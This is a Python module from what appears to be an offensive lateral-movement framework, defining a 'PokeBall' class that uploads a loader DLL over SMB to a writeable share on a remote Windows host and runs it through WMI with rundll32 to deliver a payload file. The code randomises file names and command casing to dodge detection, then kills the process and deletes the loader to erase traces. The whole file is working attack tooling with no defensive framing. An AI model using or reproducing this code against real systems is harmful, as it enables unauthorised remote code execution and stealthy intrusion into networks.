# -*- coding: UTF-8 -*-

import logging
import os
import time

from framework import utils
from framework.connector import delete_file
from framework.connector import init_smb_connection
from framework.connector import log_smb_info
from framework.connector import upload_file
from framework.helpers import WmiHelper
from framework.pokeball import BasePokeBall


class PokeBall(BasePokeBall):
    desc = "(User) WMI + unsigned.dll (XP+)"
    local_loader_path = None

    tree = None
    loader_name = None
    loader_uploaded = False

    run_dll = False

    def init(self):
        self.payload_path = os.path.join(self.opts["data"], "payload", "pikachu.bin")
        if not os.path.exists(self.payload_path):
            raise Exception("{} does not existed".format(self.payload_path))
        self.local_loader_path = os.path.join(self.opts["data"], "loader", "DLL.dll")
        if not os.path.exists(self.local_loader_path):
            raise Exception("{} does not existed".format(self.local_loader_path))

        self.smb_conn = init_smb_connection(self.opts)
        log_smb_info(self.smb_conn)

        self.helper = WmiHelper(self.opts, self.smb_conn)
        self.helper.init()

    def delivery_loader(self):
        self.tree = utils.get_writeable_share(self.opts, self.smb_conn)
        if self.tree is None:
            raise Exception("Cannot find any writeable share folder")

        self.loader_name = "{0}.{1}".format(utils.get_random_name(), utils.get_random_extension())
        upload_file(self.local_loader_path, self.smb_conn, self.tree, self.loader_name)
        self.loader_uploaded = True

        command = '{0} "{1}\\{2}",Format {3}'.format(
            utils.random_case("start /B rundll32"), utils.resolve_path(self.smb_conn, self.tree), self.loader_name,
            self.pipe_name)
        logging.info("Executing: {}".format(command))
        self.helper.execute_command(command)
        self.run_dll = True
        time.sleep(2)

    def clean_up(self):
        if self.run_dll:
            try:
                command = "wmic process where \"name='rundll32.exe' " \
                          "and commandline like '%{}%'\" " \
                          "call terminate".format(self.pipe_name)
                command = utils.random_case(command)
                self.helper.execute_command(command)
            except Exception as e:
                logging.error(e)

        if self.loader_uploaded:
            try:
                delete_file(self.smb_conn, self.tree, self.loader_name)
            except Exception as e:
                logging.error(e)
        self.helper.clean_up()
